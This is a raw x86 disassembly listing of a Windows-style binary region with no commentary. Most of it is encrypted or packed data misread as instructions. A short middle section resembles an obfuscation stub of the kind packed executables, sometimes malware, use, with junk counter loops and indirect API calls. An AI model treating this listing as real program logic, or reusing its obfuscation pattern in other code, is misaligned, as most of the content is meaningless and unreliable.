  40a73b:	out    0xb4,al
  40a73d:	and    bl,BYTE PTR [ecx+0x5fd10c18]
  40a743:	sbb    DWORD PTR [eax+0x5e],edx
  40a746:	or     esp,DWORD PTR [edx-0x32eb279d]
  40a74c:	(bad)  
  40a74d:	es jecxz 0x40a77a
  40a750:	mov    al,ds:0xb6c80a58
  40a755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a756:	inc    eax
  40a757:	and    DWORD PTR [esi-0xf],eax
  40a75a:	loope  0x40a6f4
  40a75c:	in     al,dx
  40a75d:	cmp    edx,DWORD PTR [edi-0x6067511]
  40a763:	test   dl,al
  40a765:	jbe    0x40a7d9
  40a767:	fbstp  TBYTE PTR [edx-0x14ccfc5b]
  40a76d:	lods   al,BYTE PTR ds:[esi]
  40a76e:	and    bl,ah
  40a770:	dec    esi
  40a771:	xor    esi,DWORD PTR [edi+0x3b]
  40a774:	dec    esp
  40a775:	scas   al,BYTE PTR es:[edi]
  40a776:	ror    BYTE PTR [ebx+0x7c],1
  40a779:	jbe    0x40a78d
  40a77b:	es ss call 0xabe998e4
  40a782:	or     edi,esi
  40a784:	xor    eax,0x65afb05e
  40a789:	mov    dl,0x33
  40a78b:	out    0x17,al
  40a78d:	jmp    0x40a73a
  40a78f:	adc    bl,cl
  40a791:	xor    al,0x3b
  40a793:	xchg   edi,eax
  40a794:	or     BYTE PTR [edi],dh
  40a796:	xchg   ebp,eax
  40a797:	inc    ebp
  40a798:	lock xor dl,bl
  40a79b:	mov    al,ds:0x1926cec2
  40a7a0:	mov    esi,0xfa10adc5
  40a7a5:	test   eax,0xfbae79ee
  40a7aa:	rcl    DWORD PTR [ebp+0x1fb91af8],cl
  40a7b0:	jb     0x40a7a3
  40a7b2:	inc    eax
  40a7b3:	pop    ebp
  40a7b4:	dec    ecx
  40a7b5:	jp     0x40a835
  40a7b7:	ins    BYTE PTR es:[edi],dx
  40a7b8:	idiv   DWORD PTR [ecx]
  40a7ba:	fwait
  40a7bb:	and    eax,DWORD PTR [ecx+0x76b125fc]
  40a7c1:	imul   edi,DWORD PTR [ebx],0x1d
  40a7c4:	fwait
  40a7c5:	mov    dh,0x99
  40a7c7:	jns    0x40a804
  40a7c9:	mov    eax,0x460da792
  40a7ce:	mov    bl,0x2e
  40a7d0:	mov    eax,0xf373ecc9
  40a7d5:	inc    esi
  40a7d6:	cmc    
  40a7d7:	jne    0x40a800
  40a7d9:	xor    al,0xb1
  40a7db:	ret    
  40a7dc:	mov    WORD PTR [esi+0x16c9c72a],?
  40a7e2:	test   BYTE PTR [ebp-0x74],0xf7
  40a7e6:	(bad)  
  40a7e8:	dec    edi
  40a7e9:	dec    ecx
  40a7ea:	clc    
  40a7eb:	dec    ecx
  40a7ec:	pop    ebx
  40a7ed:	inc    eax
  40a7ee:	xor    BYTE PTR [ebp+0x77],bl
  40a7f1:	sbb    dl,BYTE PTR [esi]
  40a7f3:	mov    ds,WORD PTR [ebx-0x79]
  40a7f6:	outs   dx,BYTE PTR ds:[esi]
  40a7f7:	jmp    0x9550:0xb26fd592
  40a7fe:	aad    0x59
  40a800:	sbb    al,0xa6
  40a802:	dec    eax
  40a803:	pop    edi
  40a804:	loopne 0x40a807
  40a806:	hlt    
  40a807:	jno    0x40a7be
  40a809:	comiss xmm5,xmm4
  40a80c:	les    esp,FWORD PTR [esi-0x4fe7ba09]
  40a812:	pop    ebp
  40a813:	pop    edi
  40a814:	add    bh,BYTE PTR [eax]
  40a816:	enter  0xf45e,0x99
  40a81a:	hlt    
  40a81b:	jl     0x40a845
  40a81d:	and    ecx,DWORD PTR [eax-0x54]
  40a820:	shl    BYTE PTR [eax],cl
  40a822:	pop    edx
  40a823:	fbstp  TBYTE PTR [ebx+0x1]
  40a826:	rep stos DWORD PTR es:[edi],eax
  40a828:	xchg   edi,eax
  40a829:	xchg   edi,eax
  40a82a:	xor    DWORD PTR [eax-0x5076e405],ecx
  40a830:	xchg   esp,eax
  40a831:	sub    al,0xba
  40a833:	sahf   
  40a834:	(bad)  
  40a835:	push   0x56921d6
  40a83a:	fld    TBYTE PTR [eax-0x24e42c67]
  40a840:	ret    0xb629
  40a843:	xor    DWORD PTR [ebx-0x61],esp
  40a846:	dec    esi
  40a847:	push   esi
  40a848:	xor    eax,0xf7c48d93
  40a84d:	sub    ebx,edx
  40a84f:	jmp    0x40a853
  40a851:	popf   
  40a852:	mov    esp,0x5da2394f
  40a857:	or     DWORD PTR [ebp-0x3ab29e70],ebp
  40a85d:	nop
  40a85e:	and    DWORD PTR ds:0xe1ba462b,0x756d311b
  40a868:	in     eax,dx
  40a869:	xchg   edx,eax
  40a86a:	inc    ecx
  40a86b:	es repnz or eax,0x97399bda
  40a872:	add    dl,0xfa
  40a875:	push   eax
  40a876:	cmp    ch,0xb9
  40a879:	push   eax
  40a87a:	pop    es
  40a87b:	jae    0x40a821
  40a87d:	retf   0x460b
  40a880:	push   ss
  40a881:	nop
  40a882:	sbb    DWORD PTR [edx+0x467cc483],eax
  40a888:	pminub mm0,QWORD PTR [esi]
  40a88b:	jle    0x40a81c
  40a88d:	jmp    0x40a87c
  40a88f:	mov    ds:0xee94b979,eax
  40a894:	push   ebp
  40a895:	mov    ah,BYTE PTR [edx-0x16]
  40a898:	retf   
  40a899:	hlt    
  40a89a:	mov    edx,0xbb3836a2
  40a89f:	loope  0x40a8ab
  40a8a1:	pop    ebp
  40a8a2:	jg     0x40a8f8
  40a8a4:	ds dec eax
  40a8a6:	push   ebp
  40a8a7:	pop    eax
  40a8a8:	sbb    al,dh
  40a8aa:	xlat   BYTE PTR ds:[ebx]
  40a8ab:	jecxz  0x40a87c
  40a8ad:	cli    
  40a8ae:	jle    0x40a83e
  40a8b0:	jne    0x40a847
  40a8b2:	pop    ds
  40a8b3:	loope  0x40a88a
  40a8b5:	addr16 fstp st(5)
  40a8b8:	pop    eax
  40a8b9:	adc    dh,BYTE PTR [ecx+esi*4]
  40a8bc:	adc    al,0x7d
  40a8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8bf:	ins    DWORD PTR es:[edi],dx
  40a8c0:	daa    
  40a8c1:	dec    esi
  40a8c2:	mov    ebx,ebp
  40a8c4:	and    eax,0xc92b812b
  40a8c9:	iret   
  40a8ca:	mov    bl,0x57
  40a8cc:	cmp    ebx,DWORD PTR [edi-0x403cac6e]
  40a8d2:	mov    ch,0xa0
  40a8d4:	mov    ebx,DWORD PTR [ecx]
  40a8d6:	out    dx,eax
  40a8d7:	sub    edi,DWORD PTR [edi]
  40a8d9:	xchg   ebx,eax
  40a8da:	repnz lahf 
  40a8dc:	jns    0x40a8e6
  40a8de:	mov    DWORD PTR [esi-0x74],ebx
  40a8e1:	adc    ebx,esi
  40a8e3:	test   al,0x9a
  40a8e5:	jmp    0x40a93c
  40a8e7:	(bad)  
  40a8e8:	fnstsw WORD PTR [esi+ebp*8]
  40a8eb:	push   cs
  40a8ec:	mov    ecx,0xfb38d3c6
  40a8f1:	retf   
  40a8f2:	lods   eax,DWORD PTR ds:[esi]
  40a8f3:	imul   edi,edx,0xf8721ba0
  40a8f9:	mov    eax,ds:0xd5133a07
  40a8fe:	jb     0x40a8c2
  40a900:	xchg   BYTE PTR [eax+0x5a],bl
  40a903:	jg     0x40a899
  40a905:	in     eax,0xb
  40a907:	pop    esp
  40a908:	lock mov dl,0xe8
  40a90b:	push   0x59b775e2
  40a910:	bswap  edx
  40a912:	div    BYTE PTR [edx+0x56aed5f0]
  40a918:	xchg   esp,eax
  40a919:	pop    esp
  40a91a:	sub    DWORD PTR [eax],0xc0aac16f
  40a920:	or     ecx,DWORD PTR [eax+0x19f70188]
  40a926:	mov    esp,0x17439b27
  40a92b:	inc    DWORD PTR [eax]
  40a92d:	pop    esp
  40a92e:	and    ebx,eax
  40a930:	hlt    
  40a931:	popf   
  40a932:	add    edx,edi
  40a934:	ds cmc 
  40a936:	rcl    dl,0x34
  40a939:	inc    eax
  40a93a:	add    al,0x5b
  40a93c:	repnz fs retf 0x20a0
  40a941:	inc    eax
  40a942:	aas    
  40a943:	clc    
  40a944:	inc    ebp
  40a945:	pushf  
  40a946:	dec    ebp
  40a947:	(bad)  
  40a949:	xchg   edi,eax
  40a94a:	sub    dh,BYTE PTR [ebp+0x4dccfd1b]
  40a950:	out    0x41,eax
  40a952:	mov    bh,0x92
  40a954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a955:	repnz rol BYTE PTR [edi+0x22f2d34c],cl
  40a95c:	pop    esp
  40a95d:	pop    ecx
  40a95e:	mov    bh,0x9c
  40a960:	ins    BYTE PTR es:[edi],dx
  40a961:	push   eax
  40a962:	jne    0x40a9c6
  40a964:	test   al,0xf0
  40a966:	jp     0x40a94b
  40a968:	cmc    
  40a969:	cs cdq 
  40a96b:	push   0xdab923f6
  40a970:	retf   
  40a971:	cmovs  bp,WORD PTR [edi+0x52]
  40a976:	call   0x8db:0xf5abc850
  40a97d:	sbb    al,0xd6
  40a97f:	imul   edx,DWORD PTR ds:0xae056205,0x1e
  40a986:	push   es
  40a987:	jmp    0x35a4:0x3caa76d3
  40a98e:	mov    ebp,0x8156c730
  40a993:	or     eax,0x428e7f
  40a998:	loope  0x40aa14
  40a99a:	add    BYTE PTR [eax],al
  40a99c:	mov    esi,0x75108af
  40a9a1:	xor    eax,esi
  40a9a3:	push   edi
  40a9a4:	and    edi,0x47d2
  40a9aa:	mov    edi,0x3272f6
  40a9af:	and    DWORD PTR ds:0x428e57,0xe9
  40a9b9:	add    eax,edi
  40a9bb:	mov    DWORD PTR [ebp-0x1c],eax
  40a9be:	mov    eax,DWORD PTR [ebp+0x14]
  40a9c1:	adc    DWORD PTR ds:0x428e97,0x7644
  40a9cb:	test   eax,eax
  40a9cd:	je     0x40aa21
  40a9d3:	and    DWORD PTR ds:0x428e83,0x0
  40a9dd:	mov    eax,ds:0x428e83
  40a9e2:	inc    eax
  40a9e3:	mov    ds:0x428e83,eax
  40a9e8:	cmp    DWORD PTR ds:0x428e83,0x1e
  40a9ef:	jl     0x40aa18
  40a9f5:	jmp    0x40aa0b
  40a9fa:	push   DWORD PTR [ebp-0x24]
  40a9fd:	push   0x428e43
  40aa02:	push   DWORD PTR [ebp-0x10]
  40aa05:	call   DWORD PTR ds:0x42a9ff
  40aa0b:	cmp    DWORD PTR ds:0x428e83,0x17
  40aa12:	jb     0x40a9dd
  40aa18:	mov    eax,DWORD PTR [ebp+0x14]
  40aa1b:	mov    eax,DWORD PTR [eax]
  40aa1d:	dec    ebx
  40aa1e:	mov    DWORD PTR [ebp-0x1c],eax
  40aa21:	mov    eax,DWORD PTR [ebp-0x4]
  40aa24:	xor    DWORD PTR ds:0x428e2b,0x506a
  40aa2e:	xor    eax,esi
  40aa30:	and    DWORD PTR ds:0x428e7f,edi
  40aa36:	add    eax,edi
  40aa38:	mov    DWORD PTR [ebp-0x8],eax
  40aa3b:	mov    DWORD PTR ds:0x428e97,0x1e
  40aa45:	cmp    DWORD PTR ds:0x428e97,0x0
  40aa4c:	je     0x40aa81
  40aa52:	cmp    DWORD PTR ds:0x428e97,0x20
  40aa59:	jg     0x40aa81
  40aa5f:	jmp    0x40aa6f
  40aa64:	push   0x4281a7
  40aa69:	call   DWORD PTR ds:0x42a9cb
  40aa6f:	mov    ebx,DWORD PTR ds:0x428e97
  40aa75:	dec    ebx
  40aa76:	mov    DWORD PTR ds:0x428e97,ebx
  40aa7c:	jmp    0x40aa45
  40aa81:	mov    eax,DWORD PTR [ebp-0xc]
  40aa84:	add    DWORD PTR ds:0x428eaf,edx
  40aa8a:	xor    eax,esi
  40aa8c:	add    eax,edi
  40aa8e:	mov    ebx,DWORD PTR ds:0x429bfb
  40aa94:	mov    ebx,DWORD PTR [ebx]
  40aa96:	or     DWORD PTR ds:0x428ebb,ebx
  40aa9c:	mov    DWORD PTR [ebp-0x24],eax
  40aa9f:	and    DWORD PTR ds:0x428e27,0x0
  40aaa9:	jmp    0x40aabb
  40aaae:	mov    ebx,DWORD PTR ds:0x428e27
  40aab4:	inc    ebx
  40aab5:	mov    DWORD PTR ds:0x428e27,ebx
  40aabb:	cmp    DWORD PTR ds:0x428e27,0x13
  40aac2:	jae    0x40ce99
  40aac8:	cmp    DWORD PTR ds:0x428e27,0x18
  40aacf:	jle    0x40ce99
  40aad5:	jmp    0x40aae5
  40aada:	push   0x428173
  40aadf:	call   DWORD PTR ds:0x42a9cf
  40aae5:	jmp    0x40aaae
  40aaea:	jmp    0x40ce99
  40aaef:	dec    edx
  40aaf0:	shr    ah,1
  40aaf2:	shl    esp,0x9d
  40aaf5:	push   es
  40aaf6:	mov    bl,dl
  40aaf8:	adc    BYTE PTR [edx+0x6f],bh
  40aafb:	imul   edx,DWORD PTR ss:[eax],0x83f6e783
  40ab02:	xor    ecx,0x60
  40ab05:	add    DWORD PTR [ebx-0x1e7795fa],0x21
  40ab0c:	loopne 0x40ab0f
  40ab0e:	xchg   esi,eax
  40ab0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab10:	xor    esi,DWORD PTR [esi]
  40ab12:	xlat   BYTE PTR ds:[ebx]
  40ab13:	mov    ds:0x71db1a3f,al
  40ab18:	mov    ch,0xe3
  40ab1a:	cmp    eax,DWORD PTR [esi-0x55ad6654]
  40ab20:	cmp    cl,al
  40ab22:	or     BYTE PTR [edi+eiz*8],ch
  40ab25:	stos   DWORD PTR es:[edi],eax
  40ab26:	ins    DWORD PTR es:[edi],dx
  40ab27:	dec    edx
  40ab28:	test   al,0x97
  40ab2a:	leave  
  40ab2b:	pop    ecx
  40ab2c:	out    dx,eax
  40ab2d:	ins    BYTE PTR es:[edi],dx
  40ab2e:	ret    
  40ab2f:	or     BYTE PTR [esi],0x5
  40ab32:	aad    0xae
  40ab34:	shr    BYTE PTR [esp+ebp*2+0x662af76d],0x12
  40ab3c:	hlt    
  40ab3d:	sar    BYTE PTR [esi-0x10c04a41],0x53
  40ab44:	mov    ebp,DWORD PTR [esi]
  40ab46:	popf   
  40ab47:	and    ecx,edx
  40ab49:	and    al,BYTE PTR [ecx]
  40ab4b:	mov    ds:0x97f4089c,eax
  40ab50:	cli    
  40ab51:	sub    BYTE PTR [ebp-0x2e],dl
  40ab54:	es in  eax,0x1e
  40ab57:	aam    0x36
  40ab59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab5a:	cli    
  40ab5b:	jge    0x40ab90
  40ab5d:	cwde   
  40ab5e:	icebp  
  40ab5f:	(bad)  
  40ab60:	mov    cl,0x2d
  40ab62:	je     0x40abca
  40ab64:	sub    eax,0xb80799b9
  40ab69:	adc    BYTE PTR [esi+ebp*2-0x2862bef7],bh
  40ab70:	pop    ebp
  40ab71:	jb     0x40abc9
  40ab73:	jno    0x40aafd
  40ab75:	inc    eax
  40ab76:	inc    esp
  40ab78:	pop    esp
  40ab79:	sbb    eax,0x2a3ed1c6
  40ab7e:	dec    DWORD PTR [edi-0x76d476a9]
  40ab84:	adc    BYTE PTR ds:0xb2c74333,cl
  40ab8a:	stos   DWORD PTR es:[edi],eax
  40ab8b:	in     al,0x9e
  40ab8d:	push   cs
  40ab8e:	in     al,dx
  40ab8f:	xchg   esp,ebx
  40ab91:	retf   0xdb58
  40ab94:	out    dx,al
  40ab95:	imul   edi,DWORD PTR [ecx-0xe4a063a],0xffffffd7
  40ab9c:	xchg   esp,eax
  40ab9d:	pop    es
  40ab9e:	cmp    eax,esi
  40aba0:	jg     0x40ab5a
  40aba2:	mov    esp,0xfc0f98
  40aba7:	std    
  40aba8:	dec    ebp
  40aba9:	xor    BYTE PTR [ebp-0x2f],ch
  40abac:	ins    BYTE PTR es:[edi],dx
  40abad:	pop    edi
  40abae:	xor    bh,BYTE PTR [edx+0x68a0fa87]
  40abb4:	scas   al,BYTE PTR es:[edi]
  40abb5:	les    eax,FWORD PTR [eax-0xfdfe773]
  40abbb:	aaa    
  40abbc:	ins    BYTE PTR es:[edi],dx
  40abbd:	je     0x40abb0
  40abbf:	imul   esp,DWORD PTR [esi-0x2fee5d53],0x8b666e22
  40abc9:	push   cs
  40abca:	outs   dx,BYTE PTR ds:[esi]
  40abcb:	xchg   esi,eax
  40abcc:	mov    dh,0xfe
  40abce:	adc    DWORD PTR [ebp+0x5d],edi
  40abd1:	pop    es
  40abd2:	div    DWORD PTR [esp+esi*2-0xceac05b]
  40abd9:	mov    bh,0xd4
  40abdb:	jge    0x40abec
  40abdd:	sub    BYTE PTR [ecx-0x2ab5ea9],ah
  40abe3:	loopne 0x40ac50
  40abe5:	push   ebp
  40abe6:	adc    ebp,DWORD PTR [edi+0x7]
  40abe9:	enter  0xd5e5,0x94
  40abed:	loop   0x40ac4c
  40abef:	mov    edi,DWORD PTR fs:[ebx]
  40abf2:	fist   WORD PTR [ecx-0x45]
  40abf5:	and    BYTE PTR [esi],0xcb
  40abf8:	or     DWORD PTR ss:[eax],0x30
  40abfc:	jnp    0x40abc3
  40abfe:	fstp   DWORD PTR [edi]
  40ac00:	rcr    dh,0xa2
  40ac03:	mov    eax,0x1169ad09
  40ac08:	les    esp,FWORD PTR [edi-0x3d]
  40ac0b:	cmp    BYTE PTR [ecx],ah
  40ac0d:	repnz add al,0xb3
  40ac11:	mov    eax,0x6f65e792
  40ac16:	inc    eax
  40ac17:	mov    ebp,0xf1b221cd
  40ac1c:	xchg   ebx,ebp
  40ac1e:	jb     0x40aba2
  40ac20:	sub    BYTE PTR [esi],ah
  40ac22:	icebp  
  40ac23:	dec    edi
  40ac24:	aas    
  40ac25:	iret   
  40ac26:	inc    ebp
  40ac27:	iret   
  40ac28:	loope  0x40abbf
  40ac2a:	mov    DWORD PTR [ebx+0x33],ebx
  40ac2d:	cmp    DWORD PTR [esp+edx*1+0x7d],eax
  40ac31:	test   DWORD PTR [ecx+0xb],0x26845b7
  40ac38:	push   0x94904f95
  40ac3d:	xchg   ecx,eax
  40ac3e:	test   eax,0x4ffc979b
  40ac43:	adc    BYTE PTR [ecx],0x16
  40ac46:	test   DWORD PTR [bx+di+0x627b],0xfc26b94a
  40ac4f:	imul   ecx,DWORD PTR [esi+0x61fc256],0x5536f889
  40ac59:	sub    al,0xa6
  40ac5b:	mov    ecx,DWORD PTR [eax-0x1d]
  40ac5e:	mov    eax,ds:0x8f9958b
  40ac63:	dec    ebp
  40ac64:	retf   0x6596
  40ac67:	call   0xddcc4f5e
  40ac6c:	(bad)  
  40ac6d:	int3   
  40ac6e:	iret   
  40ac6f:	shr    DWORD PTR [eax+0x2177d63],0x6e
  40ac76:	imul   eax,eax,0xffffffb6
  40ac79:	int    0x6
  40ac7b:	mov    DWORD PTR [ebx+0xbc884bc],ebx
  40ac81:	shl    al,1
  40ac83:	cmp    BYTE PTR ds:0x5b3424db,ah
  40ac89:	ds cdq 
  40ac8b:	out    0xfd,al
  40ac8d:	jae    0x40acf7
  40ac8f:	bnd ret 0xe4bb
  40ac93:	pushf  
  40ac94:	scas   al,BYTE PTR es:[edi]
  40ac95:	sar    BYTE PTR [esi],1
  40ac97:	mov    ebx,0x28de96eb
  40ac9c:	inc    ecx
  40ac9d:	jbe    0x40aca3
  40ac9f:	dec    ebp
  40aca0:	jo     0x40ad07
  40aca2:	sar    ecx,1
  40aca4:	sub    DWORD PTR [edx+0x78],edx
  40aca7:	jmp    0x9e868c33
  40acac:	pop    eax
  40acad:	xor    edx,DWORD PTR [eax+eiz*8]
  40acb0:	push   esi
  40acb1:	imul   edi,DWORD PTR [ecx-0x49],0xffffffbd
  40acb5:	clc    
  40acb6:	cmp    DWORD PTR [ebp-0x5],eax
  40acb9:	fstp   QWORD PTR [edx]
  40acbb:	sbb    BYTE PTR [ebx+0x7b61706e],0x78
  40acc2:	sub    DWORD PTR [eax],edi
  40acc4:	mov    al,BYTE PTR [eax]
  40acc6:	scas   al,BYTE PTR es:[edi]
  40acc7:	jne    0x40ace1
  40acc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acca:	call   0x7c9d702d
  40accf:	(bad)  
  40acd0:	stos   BYTE PTR es:[edi],al
  40acd1:	icebp  
  40acd2:	ins    BYTE PTR es:[edi],dx
  40acd3:	int    0x2f
  40acd5:	jle    0x40ac68
  40acd7:	inc    eax
  40acd8:	and    eax,eax
  40acda:	rcr    BYTE PTR [ebp-0x2ffff2b6],0x15
  40ace1:	mov    edx,0x1128f443
  40ace6:	cwde   
  40ace7:	dec    edx
  40ace8:	adc    eax,eax
  40acea:	mov    BYTE PTR [edx+0x4feaf7c0],dl
  40acf0:	fcmovnu st,st(0)
  40acf2:	mov    ds:0xa8b313f9,eax
  40acf7:	add    ah,BYTE PTR [edi+0x43]
  40acfa:	outs   dx,DWORD PTR ds:[esi]
  40acfb:	in     eax,0xfb
  40acfd:	dec    ecx
  40acfe:	ss iret 
  40ad00:	sub    eax,0xad649f0c
  40ad05:	sbb    al,0x19
  40ad07:	adc    BYTE PTR [ecx+esi*8-0x76],0xbc
  40ad0c:	dec    ebp
  40ad0d:	sbb    al,0x55
  40ad0f:	mov    al,ds:0x76db7a9b
  40ad14:	dec    ecx
  40ad15:	or     al,0xbf
  40ad17:	repnz inc edx
  40ad19:	cvttps2pi mm0,QWORD PTR [ecx+0x1f]
  40ad1d:	pushf  
  40ad1e:	add    DWORD PTR [ebp-0x10ee0ba1],esp
  40ad24:	adc    ah,BYTE PTR ss:[eax+ecx*4+0x15]
  40ad29:	inc    edx
  40ad2a:	lahf   
  40ad2b:	mov    ecx,0xcd1ee06a
  40ad30:	repnz in eax,dx
  40ad32:	pop    esp
  40ad33:	and    esp,esp
  40ad35:	shr    edi,cl
  40ad37:	les    ecx,FWORD PTR [ecx+0x53a6bf49]
  40ad3d:	and    edi,esi
  40ad3f:	pushf  
  40ad40:	das    
  40ad41:	sub    eax,0xc8b7c805
  40ad46:	fs push edi
  40ad48:	cmp    DWORD PTR [ebx],ebp
  40ad4a:	clc    
  40ad4b:	fst    QWORD PTR [ebp+0x69486d88]
  40ad51:	jne    0x40ad0b
  40ad53:	jmp    0x40ad07
  40ad55:	fstp   QWORD PTR [ebx+ecx*2+0x35]
  40ad59:	cmp    BYTE PTR [edx-0x1],0x6f
  40ad5d:	daa    
  40ad5e:	xchg   esi,eax
  40ad5f:	sbb    eax,DWORD PTR [ebp-0x1f]
  40ad62:	mov    edx,0xf6dad37e
  40ad67:	xchg   ecx,eax
  40ad68:	push   edi
  40ad69:	mov    al,ds:0x61815408
  40ad6e:	mov    DWORD PTR [ebx+0x3fdc29af],eax
  40ad74:	test   BYTE PTR [ecx],dh
  40ad76:	dec    esi
  40ad77:	daa    
  40ad78:	mov    edx,0x97a36d0
  40ad7d:	inc    ebx
  40ad7e:	ins    BYTE PTR es:[edi],dx
  40ad7f:	inc    esi
  40ad80:	shl    BYTE PTR [eax],cl
  40ad82:	into   
  40ad83:	call   0xf29d9a39
  40ad88:	push   esi
  40ad89:	iret   
  40ad8a:	cmp    eax,0xb40b3a50
  40ad8f:	mov    bh,0xfc
  40ad91:	and    al,0xfa
  40ad93:	adc    BYTE PTR [esi],cl
  40ad95:	cmp    eax,0x4d178c62
  40ad9a:	dec    esi
  40ad9b:	sub    eax,0x2e33454d
  40ada0:	mov    al,ds:0xf07638ce
  40ada5:	data16 sbb al,BYTE PTR [esi-0x6]
  40ada9:	pop    edx
  40adaa:	push   edi
  40adab:	pushf  
  40adac:	addr16 pop es
  40adae:	shr    BYTE PTR [eax],1
  40adb0:	and    eax,0x76ba5f6b
  40adb5:	xchg   ebp,eax
  40adb6:	pop    edx
  40adb7:	or     DWORD PTR [eax+0x6ea5f035],eax
  40adbd:	mov    edx,DWORD PTR [edx-0x70bd14aa]
  40adc3:	mov    al,BYTE PTR [edx]
  40adc5:	sti    
  40adc6:	cdq    
  40adc7:	mov    eax,0xe1f30f5c
  40adcc:	(bad)  
  40adcd:	jbe    0x40ad61
  40adcf:	fadd   QWORD PTR [eax-0x35]
  40add2:	repz jp 0x40ad7e
  40add5:	jge    0x40ae4a
  40add7:	xchg   edx,eax
  40add8:	mov    ds:0x39b4a6a2,al
  40addd:	daa    
  40adde:	lods   eax,DWORD PTR ds:[esi]
  40addf:	(bad)  
  40ade0:	jge    0x40adaf
  40ade2:	cs jmp 0x40ae4e
  40ade5:	or     al,ch
  40ade7:	jns    0x40ade6
  40ade9:	call   DWORD PTR [edi+0xf8c6de2]
  40adef:	jae    0x40ae18
  40adf1:	int3   
  40adf2:	adc    eax,0x552a688
  40adf7:	shl    esi,cl
  40adf9:	xchg   ebp,eax
  40adfa:	jmp    0x160a:0xefacb70c
  40ae01:	lods   eax,DWORD PTR ds:[esi]
  40ae02:	fmul   DWORD PTR [ecx+0x63500a9d]
  40ae08:	in     al,dx
  40ae09:	add    eax,0x69c6a8b6
  40ae0e:	inc    esp
  40ae0f:	int    0xb7
  40ae11:	gs dec edi
  40ae13:	sbb    BYTE PTR [ecx],ah
  40ae15:	and    ecx,DWORD PTR [esi]
  40ae17:	(bad)  
  40ae18:	popa   
  40ae19:	push   ebx
  40ae1a:	es mov ebx,0x71173f64
  40ae20:	dec    esp
  40ae21:	jno    0x40ae0d
  40ae23:	stos   DWORD PTR es:[edi],eax
  40ae24:	jp     0x40adea
  40ae26:	xchg   ebp,eax
  40ae27:	dec    edx
  40ae28:	mov    BYTE PTR [ecx+0xf823f3d],0xa3
  40ae2f:	xlat   BYTE PTR ds:[ebx]
  40ae30:	and    DWORD PTR ds:0x42e64cc6,0xffffffb0
  40ae37:	jmp    0x40adf2
  40ae39:	and    al,0x9e
  40ae3b:	rol    BYTE PTR [eax+0x717373be],cl
  40ae41:	pushf  
  40ae42:	cdq    
  40ae43:	and    al,0x76
  40ae45:	imul   ebx,DWORD PTR [ecx+eiz*2],0xb42a1106
  40ae4c:	test   eax,0xa9ba5140
  40ae51:	mov    ebx,0xd14fc02c
  40ae56:	and    DWORD PTR [ebp+0x65],ecx
  40ae59:	mov    al,ds:0x5c119619
  40ae5e:	test   DWORD PTR [ebp+0x29],eax
  40ae61:	jg     0x40aeb2
  40ae63:	(bad)  
  40ae64:	iret   
  40ae65:	out    0x4a,al
  40ae67:	std    
  40ae68:	and    esp,ebx
  40ae6a:	or     eax,0x744bc023
  40ae6f:	sbb    dl,BYTE PTR [edi]
  40ae71:	xor    esi,DWORD PTR [esi+ebp*1+0x671a1617]
  40ae78:	loopne 0x40ae1d
  40ae7a:	mov    bl,0x6e
  40ae7c:	shl    DWORD PTR [eax-0x3],cl
  40ae7f:	in     eax,0x10
  40ae81:	xor    al,0xf8
  40ae83:	mov    bh,0x86
  40ae85:	sub    BYTE PTR [esi+0x16917bf1],bh
  40ae8b:	xor    DWORD PTR [edx+0x5c091c70],esi
  40ae91:	and    eax,DWORD PTR [esi-0x7eea729c]
  40ae97:	shr    esp,0xe2
  40ae9a:	and    DWORD PTR [ebp-0x4ec2212f],edi
  40aea0:	int3   
  40aea1:	test   DWORD PTR [edx+0x3c081a6],ecx
  40aea7:	dec    ebp
  40aea8:	retf   0x758c
  40aeab:	sub    BYTE PTR [esi-0x2],dh
  40aeae:	dec    ecx
  40aeaf:	or     esi,DWORD PTR [esi-0x1d]
  40aeb2:	arpl   dx,di
  40aeb4:	xor    eax,0x884b3a8d
  40aeb9:	push   0xffffffbd
  40aebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aebc:	push   ebp
  40aebd:	mov    dl,0x96
  40aebf:	push   ds
  40aec0:	out    dx,al
  40aec1:	loopne 0x40ae7d
  40aec3:	scas   eax,DWORD PTR es:[edi]
  40aec4:	das    
  40aec5:	sbb    eax,0xe5668d51
  40aeca:	add    bh,BYTE PTR [edi]
  40aecc:	les    edx,FWORD PTR [ebx]
  40aece:	cmp    BYTE PTR [ecx],al
  40aed0:	pop    ebx
  40aed1:	and    eax,DWORD PTR [esi+0x1e1ff8c]
  40aed7:	dec    ebx
  40aed8:	fstp   QWORD PTR [edi-0x4e]
  40aedb:	xchg   edx,eax
  40aedc:	adc    BYTE PTR [eax],cl
  40aede:	inc    esp
  40aedf:	jl     0x40af4d
  40aee1:	ds (bad) 
  40aee3:	fistp  DWORD PTR [ecx-0x23]
  40aee6:	mov    ch,0x42
  40aee8:	(bad)  
  40aeea:	ds xchg esi,eax
  40aeec:	scas   al,BYTE PTR es:[edi]
  40aeed:	pop    ebx
  40aeee:	cmp    eax,0x7c2c7e0e
  40aef3:	pop    eax
  40aef4:	pusha  
  40aef5:	mov    edi,0x1ba04457
  40aefa:	call   0x47b9f588
  40aeff:	call   0x25620255
  40af04:	(bad)  [eax]
  40af06:	inc    ebx
  40af07:	dec    ebx
  40af08:	mov    ds,WORD PTR [ebp+eax*1-0x7]
  40af0c:	test   al,0x5e
  40af0e:	mov    dl,cl
  40af10:	push   edx
  40af11:	xlat   BYTE PTR ds:[ebx]
  40af12:	mov    eax,ds:0xeeea70bf
  40af17:	test   al,0x6a
  40af19:	mov    ebp,0x64968772
  40af1e:	dec    edi
  40af1f:	aam    0x45
  40af21:	xchg   ecx,eax
  40af22:	fadd   st,st(5)
  40af24:	push   cs
  40af25:	or     DWORD PTR [esi+0x40859e46],eax
  40af2b:	ficom  WORD PTR [esi-0x276383f1]
  40af31:	and    al,0x2d
  40af33:	xor    BYTE PTR ds:0xb5af9f05,0xd9
  40af3a:	sbb    al,0xd9
  40af3c:	xchg   esp,eax
  40af3d:	rcl    bh,0x5
  40af40:	sbb    al,0xf3
  40af42:	push   ebp
  40af43:	(bad)  [eax+edi*8-0x5b]
  40af47:	push   ss
  40af48:	inc    eax
  40af49:	sbb    al,0xe7
  40af4b:	xor    al,BYTE PTR [esi+0x59ec3e71]
  40af51:	ja     0x40af55
